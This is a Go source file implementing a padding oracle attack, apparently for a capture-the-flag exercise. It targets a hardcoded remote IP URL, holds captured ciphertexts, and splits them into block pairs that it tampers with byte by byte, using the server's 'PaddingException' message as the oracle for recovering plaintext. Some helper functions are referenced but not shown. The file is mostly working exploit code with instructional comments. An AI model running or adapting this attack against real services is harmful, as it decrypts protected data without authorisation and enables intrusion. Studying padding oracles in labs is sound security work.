package main

import (
	"log"
	//	_ "net/http/pprof"
)

const blockLen = 16

var parallel = 100

// var baseURL = "http://localhost:5000/decrypt?cipher=%s"
// var cipherEncoded = "jigNcuWcyzd8QB7E/fm7peYSX9gnh6/gYG5Hmy/Bz7IVHVUM1hFyoCjPREV5efzK"
// var paddingError = "IncorrectPadding"

var baseURL = "http://35.227.24.107/7631b88aa5/?post=%s"

//var cipherEncoded = "wisO!xCqNUzXsrGvT-28lWmwauv!u2FFQMNwqt30tf0~"
//var cipherEncoded = "enZ2E66YbDsH9jvYUdqSUpu-KfUxfFHHGqM66DbpkrmZ-ghpdGlpDxNcn7Iaqrd1cPzgiwQUDxXZJh-CFJKkwVjDNJK8JGi57zJ7oa6joiUqAJMiVdUAXijqh0jtM5Y6!i9eo9lCAFgm46oEXGz-BMIFb!drps!zzLo2f6Tz!ygbVYhTbpS!tU5V4kIbMmbaqo5jOCfkjFzp4EU!kmNHig~~"
var cipherEncoded = "fvQAKDepsnMSNpRGmoydwG5VX80e9evRhjIEQSN8XnTItxNGSYEnpaYmdNXnrIJY!Ct-4JQqSem5Bx9q3mqMVVr!viYIn5rRxW1u!gv0!Ai4TmvtCoxTgxpflp1-wR7kuc7ucSVyOWNTAX1rGVt99m-l9eFQuC2!LnqIX38x4Dv46aFRCY0SWjvlKEiXGRBFgyUyXbwP4DxcCCmDZzb95w~~"
var paddingError = "PaddingException"

func main() {
	// usually we are given an initial, valid cipher, tampering on which, we discover the plaintext! get ready!
	// we decode it into bytes, so we can tamper it at that byte level
	cipher, err := decode(cipherEncoded)
	if err != nil {
		log.Fatal(err)
	}

	// we also need to check the overall cipher length complies with blockLen
	// as this is crucial to further logic
	if len(cipher)%blockLen != 0 {
		log.Fatal("Cipher len is bad")
	}
	blockCount := len(cipher)/blockLen - 1

	/* now, we gonna tamper at every block separately,
	thus we need to split up the whole payload into blockSize*2 sized chunks
	why that size?
	- first half - the bytes we gonna tamper on
	- second half - the bytes that will produce the padding error */
	cipherChunks := make([][]byte, blockCount)
	for i := 0; i < blockCount; i++ {
		cipherChunks[i] = make([]byte, blockLen*2)
		copy(cipherChunks[i], cipher[i*blockLen:(i+2)*blockLen])
	}

	/* so far good
	now, it's time to write the code which can decipher a single block
	this way, we feed it every cipherChunk, and get the plaintext result back! */
	// create container for a final plaintext
	plainText := make([]byte, len(cipher)-blockLen)

	// decode every cipher chunk and fill-in the relevant plaintext positions
	outChan, status := hollyHack(len(plainText))
	// for i, cipherChunk := range cipherChunks {
	for i := len(cipherChunks) - 1; i >= 0; i-- {
		plainChunk, err := decipherChunk(cipherChunks[i], outChan)
		if err != nil {
			log.Fatal(err)
		}
		copy(plainText[i*16:(i+1)*16], plainChunk)
	}

	// that's it!
	status.print(true)
	//fmt.Printf("\r%s", string(plainText))
}
